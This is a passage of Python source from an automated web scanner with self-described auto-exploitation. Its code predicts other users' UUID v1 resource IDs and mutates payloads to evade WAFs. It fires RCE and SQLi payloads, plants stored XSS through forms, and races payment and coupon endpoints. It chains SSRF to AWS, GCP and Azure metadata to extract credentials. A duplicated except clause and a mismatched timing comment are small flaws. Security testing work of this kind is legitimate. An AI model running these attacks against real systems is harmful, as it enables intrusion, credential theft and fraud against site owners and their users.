def scan_bola_uuid_v1_timestamp(crawl_data):
    """BOLA via UUID v1 timestamp prediction — predict other users' resource IDs."""
    import uuid as _uuid
    findings = []
    uuid_v1_pattern = re.compile(
        r'[0-9a-f]{8}-[0-9a-f]{4}-1[0-9a-f]{3}-[89ab][0-9a-f]{3}-[0-9a-f]{12}',
        re.IGNORECASE
    )
    for url, params in crawl_data.get("params", {}).items():
        for p in params:
            # Check if any param value looks like UUID v1
            parsed = urllib.parse.urlparse(url)
            qs = urllib.parse.parse_qs(parsed.query)
            for val in qs.get(p, []):
                if uuid_v1_pattern.match(val):
                    try:
                        # Extract timestamp from UUID v1
                        u = _uuid.UUID(val)
                        if u.version == 1:
                            # Generate adjacent UUIDs by manipulating timestamp
                            ts = u.time
                            # Try ±1 second (10M 100ns intervals)
                            for offset in [-10_000_000, 10_000_000, -100_000_000]:
                                new_ts = ts + offset
                                # Reconstruct UUID v1 with new timestamp
                                time_low = new_ts & 0xFFFFFFFF
                                time_mid = (new_ts >> 32) & 0xFFFF
                                time_hi = (new_ts >> 48) & 0x0FFF
                                predicted = _uuid.UUID(
                                    fields=(time_low, time_mid, 0x1000 | time_hi,
                                            u.clock_seq_hi_variant, u.clock_seq_low, u.node)
                                )
                                qs[p] = [str(predicted)]
                                test_url = parsed._replace(
                                    query=urllib.parse.urlencode(qs, doseq=True)).geturl()
                                r = _S.get(test_url, timeout=_TIMEOUT)
                                if r.status_code == 200 and len(r.text) > 50:
                                    findings.append({
                                        "type": "BOLA via UUID v1 Timestamp Prediction",
                                        "severity": "critical",
                                        "url": test_url,
                                        "detail": f"UUID v1 in param '{p}' — predicted adjacent resource ID returns data. Original: {val}",
                                        "template": "apex-bola-uuid-v1",
                                    })
                                    break
                    except Exception:
                        continue
    return findings


# ---------------------------------------------------------------------------
# Batch 18 — Power upgrades: differential analysis, WAF bypass engine, DOM engine
# ---------------------------------------------------------------------------

_WAF_BYPASS_MODE = False  # set True when WAF detected

# WAF bypass mutation engine — auto-encodes payloads when blocked
_WAF_MUTATIONS = [
    lambda p: p,  # original
    lambda p: p.replace("<", "%3C").replace(">", "%3E"),  # URL encode
    lambda p: p.replace("<", "\\u003c").replace(">", "\\u003e"),  # Unicode escape
    lambda p: p.replace(" ", "/**/"),  # SQL comment bypass
    lambda p: p.replace("'", "%27").replace('"', "%22"),  # quote encode
    lambda p: p.replace("SELECT", "SeLeCt").replace("UNION", "UnIoN"),  # case toggle
    lambda p: p.replace("<script", "<scr\x00ipt"),  # null byte
    lambda p: p.replace("<", "<\t").replace(">", "\t>"),  # tab insertion
    lambda p: p.replace("../", "..%252f"),  # double encode
    lambda p: p.replace("'", "ʼ").replace('"', '＂'),  # unicode homoglyph
    lambda p: f"<!-->{p}",  # HTML comment prefix
    lambda p: p.replace("alert", "al\\u0065rt"),  # JS unicode escape
]


def waf_bypass_test(url, param, payloads, method="GET"):
    """Test payloads with automatic WAF bypass mutations. Returns first successful payload+response."""
    for payload in payloads:
        mutations = _WAF_MUTATIONS if _WAF_BYPASS_MODE else _WAF_MUTATIONS[:1]
        for mutate in mutations:
            mutated = mutate(payload)
            try:
                parsed = urllib.parse.urlparse(url)
                qs = urllib.parse.parse_qs(parsed.query)
                qs[param] = [mutated]
                test_url = parsed._replace(query=urllib.parse.urlencode(qs, doseq=True)).geturl()
                if method == "GET":
                    r = _S.get(test_url, timeout=_TIMEOUT)
                else:
                    r = _S.post(url, data={param: mutated}, timeout=_TIMEOUT)
                # WAF blocked?
                if r.status_code in (403, 406, 429) and _WAF_BYPASS_MODE:
                    continue  # try next mutation
                return mutated, test_url, r
            except Exception:
                continue
    return None, None, None


def scan_differential_auth(crawl_data, web_targets, auth_session=None):
    """Differential analysis — compare responses with/without auth to find IDOR and auth bypass.
    This is the #1 technique for finding real bugs that pay bounties."""
    findings = []
    if not auth_session:
        return findings

    tested = set()
    for url in list(crawl_data.get("params", {}).keys())[:30]:
        base_path = url.split("?")[0]
        if base_path in tested:
            continue
        tested.add(base_path)
        try:
            # Request with auth
            r_auth = auth_session.get(url, timeout=_TIMEOUT)
            # Request without auth
            r_noauth = _S.get(url, timeout=_TIMEOUT)

            if r_auth.status_code == 200 and r_noauth.status_code == 200:
                # If unauth response contains same sensitive data as auth response
                # that's an auth bypass
                auth_len = len(r_auth.text)
                noauth_len = len(r_noauth.text)

                # Similar response size = likely same data returned without auth
                if auth_len > 100 and noauth_len > 100:
                    ratio = min(auth_len, noauth_len) / max(auth_len, noauth_len)
                    if ratio > 0.85:
                        # Check for sensitive patterns in unauth response
                        sensitive = ["email", "phone", "address", "ssn", "password",
                                     "token", "secret", "credit", "balance", "account"]
                        leaked = [s for s in sensitive if s in r_noauth.text.lower()]
                        if leaked:
                            findings.append({
                                "type": "Authentication Bypass — Sensitive Data Exposed",
                                "severity": "critical",
                                "url": url,
                                "detail": f"Unauthenticated response contains: {', '.join(leaked)}. Response similarity: {ratio:.0%}",
                                "template": "apex-auth-bypass-diff",
                            })

            # 403 with auth but 200 without = broken access control
            elif r_auth.status_code == 403 and r_noauth.status_code == 200:
                findings.append({
                    "type": "Broken Access Control — Role Bypass",
                    "severity": "high",
                    "url": url,
                    "detail": "Authenticated user gets 403 but unauthenticated gets 200 — inverted access control",
                    "template": "apex-bac-inversion",
                })
        except Exception:
            continue
    return findings


def scan_param_discovery(crawl_data, web_targets):
    """Hidden parameter discovery via response differential — finds params not in HTML/JS.
    Technique: add common param names and check if response changes."""
    findings = []
    HIDDEN_PARAMS = [
        "debug", "test", "admin", "internal", "verbose", "dev", "staging",
        "role", "is_admin", "user_id", "account_id", "org_id", "tenant",
        "callback", "redirect", "next", "return", "goto", "url", "path",
        "file", "template", "page", "include", "format", "output",
        "api_key", "token", "secret", "key", "auth", "access_token",
        "price", "amount", "quantity", "discount", "total", "fee",
    ]
    tested = set()
    for target in web_targets[:8]:
        base = target.rstrip("/")
        if base in tested:
            continue
        tested.add(base)
        try:
            # Baseline response
            r_base = _S.get(base, timeout=_TIMEOUT)
            base_len = len(r_base.text)
            base_status = r_base.status_code

            # Test each hidden param
            test_urls = [f"{base}?{p}=1" for p in HIDDEN_PARAMS]
            for test_url, r in batch_get(test_urls, timeout=_TIMEOUT_SHORT):
                if r is None:
                    continue
                param = test_url.split("?")[1].split("=")[0]
                # Significant response change = param is processed
                if r.status_code != base_status:
                    findings.append({
                        "type": f"Hidden Parameter: {param}",
                        "severity": "medium",
                        "url": test_url,
                        "detail": f"Param '{param}' changes status: {base_status} → {r.status_code}",
                        "template": "apex-hidden-param",
                    })
                elif abs(len(r.text) - base_len) > 200:
                    # Check if it reveals debug info
                    if any(x in r.text.lower() for x in ["stack trace", "debug", "error",
                                                          "exception", "traceback", "sql"]):
                        findings.append({
                            "type": f"Hidden Debug Parameter: {param}",
                            "severity": "high",
                            "url": test_url,
                            "detail": f"Param '{param}' enables debug output (+{len(r.text)-base_len} bytes)",
                            "template": "apex-hidden-param-debug",
                        })
        except Exception:
            continue
    return findings


def scan_response_manipulation_ato(crawl_data):
    """Account takeover via response manipulation — modify response to bypass client-side auth checks."""
    findings = []
    auth_endpoints = []
    for url in crawl_data.get("params", {}).keys():
        lower = url.lower()
        if any(x in lower for x in ["/login", "/auth", "/signin", "/verify",
                                      "/otp", "/2fa", "/mfa", "/reset"]):
            auth_endpoints.append(url)

    for url in auth_endpoints[:5]:
        try:
            # Send invalid credentials and check if response contains manipulable fields
            base = "/".join(url.split("/", 3)[:3])
            for path in ["/api/login", "/api/auth", "/auth/verify", "/api/verify-otp"]:
                ep = f"{base}{path}"
                r = _S.post(ep, json={"email": "test@test.com", "password": "wrong",
                                       "otp": "000000"}, timeout=_TIMEOUT)
                if r.status_code in (200, 401, 403):
                    try:
                        data = r.json()
                        # If response has boolean success/verified fields, it's manipulable
                        manipulable = [k for k in data.keys()
                                       if k.lower() in ("success", "verified", "valid",
                                                         "authenticated", "approved", "status",
                                                         "is_valid", "otp_valid")]
                        if manipulable:
                            findings.append({
                                "type": "Response Manipulation — Auth Bypass Possible",
                                "severity": "high",
                                "url": ep,
                                "detail": f"Auth response contains client-checkable fields: {manipulable}. Intercept and change to true for ATO.",
                                "template": "apex-response-manipulation",
                            })
                    except Exception:
                        pass
        except Exception:
            continue
    return findings


def scan_race_condition_critical(crawl_data, web_targets):
    """Race condition on critical operations — coupon redemption, money transfer, registration."""
    findings = []
    critical_patterns = {
        "coupon": ["coupon", "promo", "discount", "voucher", "redeem"],
        "payment": ["pay", "transfer", "withdraw", "send", "checkout"],
        "registration": ["register", "signup", "create-account", "invite"],
        "vote": ["vote", "like", "upvote", "rate", "review"],
    }

    for url in list(crawl_data.get("params", {}).keys())[:50]:
        lower = url.lower()
        for category, keywords in critical_patterns.items():
            if any(k in lower for k in keywords):
                try:
                    # Send 10 identical requests simultaneously
                    from concurrent.futures import ThreadPoolExecutor, as_completed
                    results = []

                    def _race_req():
                        try:
                            return _S.post(url, timeout=_TIMEOUT)
                        except Exception:
                            return None

                    with ThreadPoolExecutor(max_workers=10) as pool:
                        futs = [pool.submit(_race_req) for _ in range(10)]
                        for f in as_completed(futs):
                            r = f.result()
                            if r and r.status_code in (200, 201, 204):
                                results.append(r)

                    # If more than 1 succeeded, race condition exists
                    if len(results) > 1:
                        findings.append({
                            "type": f"Race Condition — {category.title()} Duplicate",
                            "severity": "critical" if category in ("payment", "coupon") else "high",
                            "url": url,
                            "detail": f"{len(results)}/10 parallel requests succeeded. {category} can be exploited multiple times.",
                            "template": "apex-race-critical",
                        })
                except Exception:
                    pass
                break
    return findings


def scan_second_order_detection(crawl_data, web_targets):
    """Second-order vulnerability detection — inject in one place, detect in another."""
    findings = []
    # Unique canary that's unlikely to appear naturally
    import hashlib
    canary_id = hashlib.md5(str(time.time()).encode()).hexdigest()[:8]
    xss_canary = f'"><img src=x onerror=apex{canary_id}>'
    sqli_canary = f"' OR apex{canary_id}='1"

    # Phase 1: Inject canaries into all writable endpoints
    injection_points = []
    for url, params in crawl_data.get("params", {}).items():
        for p in params:
            if any(x in p.lower() for x in ["name", "title", "comment", "bio",
                                              "description", "message", "note",
                                              "address", "company", "username"]):
                try:
                    parsed = urllib.parse.urlparse(url)
                    qs = urllib.parse.parse_qs(parsed.query)
                    qs[p] = [xss_canary]
                    inject_url = parsed._replace(query=urllib.parse.urlencode(qs, doseq=True)).geturl()
                    _S.get(inject_url, timeout=_TIMEOUT_SHORT)
                    injection_points.append((url, p))
                except Exception:
                    pass

    # Also inject via POST forms
    for form in crawl_data.get("forms", [])[:10]:
        action = form.get("action", "")
        if not action:
            continue
        fields = {f.get("name", ""): xss_canary for f in form.get("fields", [])
                  if f.get("name")}
        if fields:
            try:
                _S.post(action, data=fields, timeout=_TIMEOUT_SHORT)
                injection_points.append((action, "form"))
            except Exception:
                pass

    if not injection_points:
        return findings

    # Phase 2: Crawl all pages looking for our canary
    time.sleep(1)  # Give server time to process/store
    check_urls = [p["url"] for p in crawl_data.get("pages", [])[:30]]
    for check_url, r in batch_get(check_urls, timeout=_TIMEOUT_SHORT):
        if r and f"apex{canary_id}" in r.text:
            findings.append({
                "type": "Stored/Second-Order XSS",
                "severity": "high",
                "url": check_url,
                "detail": f"Canary injected via {len(injection_points)} endpoints appeared on {check_url}",
                "template": "apex-stored-xss",
            })
            break  # One confirmed is enough

    return findings


# ---------------------------------------------------------------------------
# Batch 19 — Headless browser engine, tech-aware payloads, auto-exploitation
# ---------------------------------------------------------------------------

def scan_dom_xss_browser(web_targets):
    """DOM XSS detection using headless browser — catches what static analysis misses."""
    findings = []
    try:
        from playwright.sync_api import sync_playwright
    except ImportError:
        return findings  # playwright not installed

    canary = "apex_dom_xss_" + str(int(time.time()))[-6:]
    dom_payloads = [
        f"#<img src=x onerror=window.{canary}=1>",
        f"?q=<img/src/onerror=window.{canary}=1>",
        f"#javascript:window.{canary}=1",
        f"?search='-window.{canary}=1-'",
        f"#{{constructor.constructor('window.{canary}=1')()}}",
    ]

    with sync_playwright() as p:
        browser = p.chromium.launch(headless=True)
        context = browser.new_context(ignore_https_errors=True)
        page = context.new_page()
        page.set_default_timeout(8000)

        for target in web_targets[:10]:
            for payload in dom_payloads:
                test_url = target.rstrip("/") + payload
                try:
                    page.goto(test_url, wait_until="domcontentloaded")
                    # Check if our canary executed
                    triggered = page.evaluate(f"() => window.{canary} === 1")
                    if triggered:
                        findings.append({
                            "type": "DOM-Based XSS (Browser Confirmed)",
                            "severity": "high",
                            "url": test_url,
                            "detail": f"Payload executed in browser DOM. Canary '{canary}' set on window.",
                            "template": "apex-dom-xss-browser",
                        })
                        page.evaluate(f"() => delete window.{canary}")
                        break
                except Exception:
                    continue
        browser.close()
    return findings


def scan_postmessage_browser(web_targets):
    """postMessage vulnerability detection — requires browser to detect listeners."""
    findings = []
    try:
        from playwright.sync_api import sync_playwright
    except ImportError:
        return findings

    with sync_playwright() as p:
        browser = p.chromium.launch(headless=True)
        context = browser.new_context(ignore_https_errors=True)
        page = context.new_page()
        page.set_default_timeout(8000)

        for target in web_targets[:8]:
            try:
                page.goto(target, wait_until="domcontentloaded")
                # Detect message event listeners
                has_listener = page.evaluate("""() => {
                    let found = false;
                    const orig = window.addEventListener;
                    // Check if any message handlers exist by inspecting getEventListeners (Chrome)
                    try {
                        const handlers = getEventListeners(window);
                        if (handlers.message && handlers.message.length > 0) found = true;
                    } catch(e) {}
                    // Fallback: inject a message and see if DOM changes
                    const before = document.body.innerHTML.length;
                    window.postMessage({type:'apex_test', data:'<img src=x>'}, '*');
                    const after = document.body.innerHTML.length;
                    if (after !== before) found = true;
                    return found;
                }""")
                if has_listener:
                    # Try XSS via postMessage
                    xss_triggered = page.evaluate("""() => {
                        return new Promise(resolve => {
                            window.__apex_pm_xss = false;
                            const origAlert = window.alert;
                            window.alert = () => { window.__apex_pm_xss = true; };
                            window.postMessage('<img src=x onerror=alert(1)>', '*');
                            window.postMessage({html:'<img src=x onerror=alert(1)>'}, '*');
                            window.postMessage({action:'render',content:'<img src=x onerror=alert(1)>'}, '*');
                            setTimeout(() => {
                                window.alert = origAlert;
                                resolve(window.__apex_pm_xss);
                            }, 500);
                        });
                    }""")
                    if xss_triggered:
                        findings.append({
                            "type": "XSS via postMessage (Browser Confirmed)",
                            "severity": "high",
                            "url": target,
                            "detail": "postMessage handler renders attacker-controlled HTML without origin check",
                            "template": "apex-postmessage-xss",
                        })
                    else:
                        findings.append({
                            "type": "postMessage Handler Without Origin Validation",
                            "severity": "medium",
                            "url": target,
                            "detail": "Window has message event listener — potential for cross-origin exploitation",
                            "template": "apex-postmessage-noorigin",
                        })
            except Exception:
                continue
        browser.close()
    return findings


# Tech-aware payload database — payloads that work on specific stacks
_TECH_PAYLOADS = {
    "laravel": {
        "rce": ["{{system('id')}}", "{{`id`}}", "@php system('id') @endphp"],
        "sqli": ["' OR 1=1-- -", "1' AND (SELECT SLEEP(3))-- -"],
        "debug": ["/_ignition/execute-solution", "/_debugbar/open", "/telescope"],
        "secrets": ["/.env", "/storage/logs/laravel.log", "/.env.backup"],
    },
    "express": {
        "rce": ["{{this.constructor.constructor('return process')().mainModule.require('child_process').execSync('id')}}"],
        "sqli": ["' OR '1'='1", "{\"$gt\":\"\"}"],  # NoSQL for Mongo
        "prototype_pollution": ["__proto__[isAdmin]=true", "constructor.prototype.isAdmin=true"],
        "secrets": ["/package.json", "/.npmrc", "/node_modules/.package-lock.json"],
    },
    "spring": {
        "rce": ["${T(java.lang.Runtime).getRuntime().exec('id')}", 
                "*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('id').getInputStream())}"],
        "actuator": ["/actuator/env", "/actuator/heapdump", "/actuator/mappings", "/env", "/jolokia"],
        "secrets": ["/actuator/configprops", "/actuator/env", "/.git/config"],
    },
    "django": {
        "ssti": ["{{settings.SECRET_KEY}}", "{% debug %}", "{{request.META}}"],
        "debug": ["/?__debugger__=yes", "/admin/"],
        "secrets": ["/settings.py", "/.env", "/manage.py"],
    },
    "nextjs": {
        "ssrf": ["/_next/image?url=http://169.254.169.254/latest/meta-data/&w=64&q=75"],
        "data_leak": ["/_next/data/BUILD_ID/index.json", "/api/__nextauth/session"],
        "source": ["/_next/static/chunks/pages/index.js", "/__nextjs_original-stack-frame"],
    },
    "wordpress": {
        "rce": ["/wp-admin/theme-editor.php", "/wp-content/debug.log"],
        "sqli": ["/wp-json/wp/v2/users", "/?author=1"],
        "secrets": ["/wp-config.php.bak", "/wp-config.php~", "/.wp-config.php.swp", "/wp-content/debug.log"],
    },
}


def scan_tech_specific(crawl_data, web_targets, technologies):
    """Technology-aware scanning — uses payloads specific to the detected stack."""
    findings = []
    if not technologies:
        return findings

    tech_lower = " ".join(technologies).lower()
    matched_techs = [t for t in _TECH_PAYLOADS if t in tech_lower]

    for tech in matched_techs:
        payloads = _TECH_PAYLOADS[tech]

        # Test secret/debug paths
        for target in web_targets[:5]:
            base = target.rstrip("/")
            secret_urls = [f"{base}{p}" for p in payloads.get("secrets", []) + payloads.get("debug", [])]
            for url, r in batch_get(secret_urls, timeout=_TIMEOUT_SHORT):
                if r and r.status_code == 200 and len(r.text) > 50:
                    if any(x in r.text.lower() for x in ["password", "secret", "key", "token",
                                                          "db_", "database", "stack trace",
                                                          "debug", "app_key", "exception"]):
                        findings.append({
                            "type": f"{tech.title()} Secret/Debug Exposure",
                            "severity": "critical" if "password" in r.text.lower() or "key" in r.text.lower() else "high",
                            "url": url,
                            "detail": f"Tech-specific path exposed ({tech}): {len(r.text)} bytes of sensitive data",
                            "template": f"apex-{tech}-secrets",
                        })

        # Test RCE payloads on injectable params
        for url, params in list(crawl_data.get("params", {}).items())[:10]:
            for p in params:
                for rce_payload in payloads.get("rce", [])[:2]:
                    mutated, test_url, r = waf_bypass_test(url, p, [rce_payload])
                    if r and any(x in r.text for x in ["uid=", "root:", "www-data", "daemon"]):
                        findings.append({
                            "type": f"RCE via {tech.title()} ({p})",
                            "severity": "critical",
                            "url": test_url,
                            "detail": f"Command execution confirmed via {tech}-specific payload on param '{p}'",
                            "template": f"apex-{tech}-rce",
                        })
                        break
    return findings


def scan_exploit_chain_ssrf_to_cloud(crawl_data, web_targets):
    """Auto-exploitation: SSRF → cloud metadata → credential extraction."""
    findings = []
    # Cloud metadata endpoints to chain through SSRF
    metadata_chain = [
        # AWS
        ("http://169.254.169.254/latest/meta-data/iam/security-credentials/", "aws", "iam role listing"),
        ("http://169.254.169.254/latest/dynamic/instance-identity/document", "aws", "instance identity"),
        # GCP
        ("http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token", "gcp", "service account token"),
        # Azure
        ("http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/", "azure", "managed identity token"),
    ]

    # Find SSRF-able params
    ssrf_params = []
    for url, params in crawl_data.get("params", {}).items():
        for p in params:
            if any(x in p.lower() for x in ["url", "uri", "src", "href", "link",
                                              "dest", "redirect", "path", "file",
                                              "fetch", "load", "proxy", "target"]):
                ssrf_params.append((url, p))

    for url, param in ssrf_params[:15]:
        for meta_url, cloud, desc in metadata_chain:
            parsed = urllib.parse.urlparse(url)
            qs = urllib.parse.parse_qs(parsed.query)
            qs[param] = [meta_url]
            test_url = parsed._replace(query=urllib.parse.urlencode(qs, doseq=True)).geturl()
            try:
                headers = {"Metadata-Flavor": "Google"} if cloud == "gcp" else {}
                r = _S.get(test_url, timeout=_TIMEOUT, headers=headers)
                if r.status_code == 200:
                    indicators = {
                        "aws": ["AccessKeyId", "SecretAccessKey", "Token", "arn:aws"],
                        "gcp": ["access_token", "token_type", "expires_in"],
                        "azure": ["access_token", "client_id", "token_type"],
                    }
                    if any(x in r.text for x in indicators[cloud]):
                        findings.append({
                            "type": f"SSRF → {cloud.upper()} Cloud Credential Theft",
                            "severity": "critical",
                            "url": test_url,
                            "detail": f"Full chain: SSRF via '{param}' → {cloud} metadata ({desc}) → credentials extracted",
                            "template": f"apex-ssrf-{cloud}-chain",
                        })
                        # If AWS, try to get the actual role credentials
                        if cloud == "aws" and "arn:aws" not in r.text:
                            # Response is role name, fetch actual creds
                            role_name = r.text.strip().split("\n")[0]
                            cred_url = f"http://169.254.169.254/latest/meta-data/iam/security-credentials/{role_name}"
                            qs[param] = [cred_url]
                            cred_test = parsed._replace(query=urllib.parse.urlencode(qs, doseq=True)).geturl()
                            r2 = _S.get(cred_test, timeout=_TIMEOUT)
                            if "AccessKeyId" in r2.text:
                                findings.append({
                                    "type": "SSRF → AWS IAM Credentials Stolen",
                                    "severity": "critical",
                                    "url": cred_test,
                                    "detail": f"Full AWS credentials extracted for role '{role_name}'. Complete account compromise.",
                                    "template": "apex-ssrf-aws-creds",
                                })
                        break
            except Exception:
                continue
    return findings


# ---------------------------------------------------------------------------
# Batch 20 — Enhanced core engines: browser-confirmed XSS, error-pattern SQLi
# ---------------------------------------------------------------------------

def scan_xss_browser_confirmed(crawl_data, web_targets):
    """XSS with browser confirmation — only reports XSS that actually executes JS.
    This eliminates false positives and proves exploitability."""
    findings = []
    try:
        from playwright.sync_api import sync_playwright
    except ImportError:
        return findings

    # Collect all reflected params first (fast, HTTP-only)
    reflected = []  # (url, param, payload)
    xss_probes = [
        '<img src=x onerror=window.__apex_xss=1>',
        '"><img src=x onerror=window.__apex_xss=1>',
        "'-window.__apex_xss=1-'",
        '<svg onload=window.__apex_xss=1>',
        '"><svg/onload=window.__apex_xss=1>',
        "javascript:window.__apex_xss=1",
    ]

    # Phase 1: Find reflected params via batch HTTP
    test_items = []
    test_meta = {}
    for url, params in list(crawl_data.get("params", {}).items())[:20]:
        for p in params[:5]:
            canary = "apex7x7x7"
            parsed = urllib.parse.urlparse(url)
            qs = urllib.parse.parse_qs(parsed.query)
            qs[p] = [canary]
            test_url = parsed._replace(query=urllib.parse.urlencode(qs, doseq=True)).geturl()
            test_items.append(test_url)
            test_meta[test_url] = (url, p)

    for test_url, r in batch_get(test_items, timeout=_TIMEOUT_SHORT):
        if r and "apex7x7x7" in r.text:
            url, p = test_meta[test_url]
            reflected.append((url, p))

    if not reflected:
        return findings

    # Phase 2: Browser-confirm XSS on reflected params
    with sync_playwright() as pw:
        browser = pw.chromium.launch(headless=True)
        ctx = browser.new_context(ignore_https_errors=True)
        page = ctx.new_page()
        page.set_default_timeout(6000)

        for url, param in reflected[:15]:
            for payload in xss_probes:
                parsed = urllib.parse.urlparse(url)
                qs = urllib.parse.parse_qs(parsed.query)
                qs[param] = [payload]
                test_url = parsed._replace(query=urllib.parse.urlencode(qs, doseq=True)).geturl()
                try:
                    page.goto(test_url, wait_until="domcontentloaded")
                    triggered = page.evaluate("() => window.__apex_xss === 1")
                    if triggered:
                        findings.append({
                            "type": "XSS (Browser Execution Confirmed)",
                            "severity": "high",
                            "url": test_url,
                            "detail": f"JavaScript executed in browser via param '{param}'. Payload: {payload[:60]}",
                            "template": "apex-xss-confirmed",
                        })
                        page.evaluate("() => delete window.__apex_xss")
                        break
                except Exception:
                    continue
        browser.close()
    return findings


def scan_sqli_error_pattern(crawl_data):
    """SQLi detection via database error pattern matching — more reliable than reflection check."""
    findings = []
    # Database-specific error patterns
    DB_ERRORS = {
        "mysql": [r"SQL syntax.*MySQL", r"Warning.*mysql_", r"MySQLSyntaxErrorException",
                  r"valid MySQL result", r"check the manual that corresponds to your MySQL"],
        "postgres": [r"PostgreSQL.*ERROR", r"pg_query\(\)", r"PSQLException",
                     r"org\.postgresql\.util", r"ERROR:\s+syntax error at or near"],
        "mssql": [r"Driver.*SQL[\-\_\ ]*Server", r"OLE DB.*SQL Server",
                  r"SQLServer JDBC Driver", r"com\.microsoft\.sqlserver"],
        "oracle": [r"ORA-[0-9]{5}", r"Oracle.*Driver", r"oracle\.jdbc"],
        "sqlite": [r"SQLite.*error", r"sqlite3\.OperationalError", r"SQLITE_ERROR"],
    }
    error_patterns = []
    for db, patterns in DB_ERRORS.items():
        for p in patterns:
            error_patterns.append((re.compile(p, re.IGNORECASE), db))

    sqli_triggers = ["'", "\"", "' OR '1'='1", "1' AND '1'='2", "' UNION SELECT NULL--",
                     "1; SELECT 1", "' OR 1=1#", "1'\"", "\\"]

    # Batch all tests
    test_items = []
    test_meta = {}
    for url, params in list(crawl_data.get("params", {}).items())[:25]:
        for p in params[:4]:
            for trigger in sqli_triggers[:4]:
                parsed = urllib.parse.urlparse(url)
                qs = urllib.parse.parse_qs(parsed.query)
                qs[p] = [trigger]
                test_url = parsed._replace(query=urllib.parse.urlencode(qs, doseq=True)).geturl()
                test_items.append(test_url)
                test_meta[test_url] = (url, p, trigger)

    found_params = set()
    for test_url, r in batch_get(test_items, timeout=_TIMEOUT):
        if r is None:
            continue
        url, param, trigger = test_meta[test_url]
        if f"{url}|{param}" in found_params:
            continue
        for pattern, db_type in error_patterns:
            if pattern.search(r.text):
                found_params.add(f"{url}|{param}")
                findings.append({
                    "type": f"SQL Injection ({db_type.upper()} Error)",
                    "severity": "critical",
                    "url": test_url,
                    "detail": f"Database error triggered via param '{param}' with payload: {trigger}. DB: {db_type}",
                    "template": "apex-sqli-error",
                })
                break
    return findings


def scan_blind_sqli_timing(crawl_data):
    """Blind SQLi via timing — fast version with 1s sleep and smart param selection."""
    findings = []
    sleep_payloads = [
        ("' OR SLEEP(1)-- -", 1),
        ("' OR pg_sleep(1)-- -", 1),
        ("'; WAITFOR DELAY '0:0:1'-- -", 1),
    ]

    # Only test params that look injectable (not all params)
    injectable_hints = ["id", "user", "name", "search", "q", "query", "filter",
                        "sort", "order", "page", "cat", "item", "product", "article"]

    for url, params in list(crawl_data.get("params", {}).items())[:10]:
        # Prioritize likely-injectable params
        priority_params = [p for p in params if any(h in p.lower() for h in injectable_hints)]
        test_params = (priority_params or params)[:2]

        for p in test_params:
            parsed = urllib.parse.urlparse(url)
            qs = urllib.parse.parse_qs(parsed.query)
            try:
                qs[p] = ["1"]
                baseline_url = parsed._replace(query=urllib.parse.urlencode(qs, doseq=True)).geturl()
                t0 = time.time()
                _S.get(baseline_url, timeout=5)
                baseline_time = time.time() - t0
            except Exception:
                continue

            for payload, expected_delay in sleep_payloads:
                qs[p] = [payload]
                test_url = parsed._replace(query=urllib.parse.urlencode(qs, doseq=True)).geturl()
                try:
                    t0 = time.time()
                    _S.get(test_url, timeout=5)
                    elapsed = time.time() - t0
                    if elapsed >= baseline_time + expected_delay - 0.3:
                        findings.append({
                            "type": "Blind SQL Injection (Time-Based)",
                            "severity": "critical",
                            "url": test_url,
                            "detail": f"Param '{p}' delays {elapsed:.1f}s (baseline: {baseline_time:.1f}s). Payload: {payload[:30]}",
                            "template": "apex-sqli-blind-time",
                        })
                        break
                except Exception:
                    continue
                except Exception:
                    continue
    return findings


def scan_open_redirect_chain_oauth(crawl_data, web_targets):
    """Open redirect → OAuth token theft chain. The #1 account takeover vector."""
    findings = []
    redirect_params = ["redirect_uri", "redirect", "next", "return", "returnTo",
                       "goto", "continue", "url", "redir", "callback", "return_to"]

    for url, params in crawl_data.get("params", {}).items():
        for p in params:
            if p.lower() not in [rp.lower() for rp in redirect_params]:
                continue
            # Test if param accepts external redirect
            evil_urls = ["https://evil.com", "//evil.com", "https://evil.com%00.legitimate.com",
                         "https://legitimate.com@evil.com", "https://evil.com#"]
            for evil in evil_urls:
                parsed = urllib.parse.urlparse(url)
                qs = urllib.parse.parse_qs(parsed.query)
                qs[p] = [evil]
                test_url = parsed._replace(query=urllib.parse.urlencode(qs, doseq=True)).geturl()
                try:
                    r = _S.get(test_url, timeout=_TIMEOUT, allow_redirects=False)
                    location = r.headers.get("Location", "")
                    if r.status_code in (301, 302, 303, 307, 308):
                        if "evil.com" in location:
                            # Check if this is an OAuth endpoint
                            is_oauth = any(x in url.lower() for x in
                                           ["/oauth", "/authorize", "/auth", "/login",
                                            "/callback", "/token", "/sso"])
                            severity = "critical" if is_oauth else "high"
                            detail = (f"Open redirect via '{p}' → {location}. "
                                      f"{'OAuth endpoint — token theft possible!' if is_oauth else 'Phishing/token theft vector.'}")
                            findings.append({
                                "type": "Open Redirect" + (" → OAuth Token Theft" if is_oauth else ""),
                                "severity": severity,
                                "url": test_url,
                                "detail": detail,
                                "template": "apex-redirect-oauth" if is_oauth else "apex-redirect",
                            })
                            break
                except Exception:
                    continue
    return findings


# ---------------------------------------------------------------------------
# PoC Generator — creates copy-paste curl commands for every finding
# ---------------------------------------------------------------------------

def generate_poc(finding):
    """Generate a copy-paste curl command that reproduces the vulnerability."""
    url = finding.get("url", "")
    template = finding.get("template", "")
    ftype = finding.get("type", "").lower()

    if not url:
        return ""

    # XSS
    if "xss" in ftype:
        return f"curl -sk '{url}' | grep -o '<[^>]*on[a-z]*=[^>]*>'"

    # SQLi
    if "sqli" in ftype or "sql" in ftype:
        if "time" in template or "blind" in template:
            return f"# Measure response time — should be >3s:\ntime curl -sk '{url}'"
        return f"curl -sk '{url}' 2>&1 | grep -iE '(SQL|syntax|mysql|postgres|oracle|error)'"

    # SSRF
    if "ssrf" in ftype:
        return f"curl -sk '{url}' | grep -iE '(ami-id|AccessKey|instance|meta-data|token)'"

    # CORS
    if "cors" in ftype:
        return f"curl -sk -H 'Origin: https://evil.com' '{url}' -D - | grep -i 'access-control'"

    # Open redirect
    if "redirect" in ftype:
        return f"curl -sk -I '{url}' | grep -i 'location'"

    # Subdomain takeover
    if "takeover" in ftype:
        host = urllib.parse.urlparse(url).hostname or ""
        return f"dig +short CNAME {host}\ncurl -sk '{url}' | head -20"

    # Sensitive file
    if "sensitive" in template or "secret" in ftype:
        return f"curl -sk '{url}' | head -50"

    # Race condition
    if "race" in ftype:
        return (f"# Send 10 parallel requests:\n"
                f"seq 10 | xargs -P10 -I{{}} curl -sk -X POST '{url}' -o /dev/null -w '%{{http_code}}\\n'")

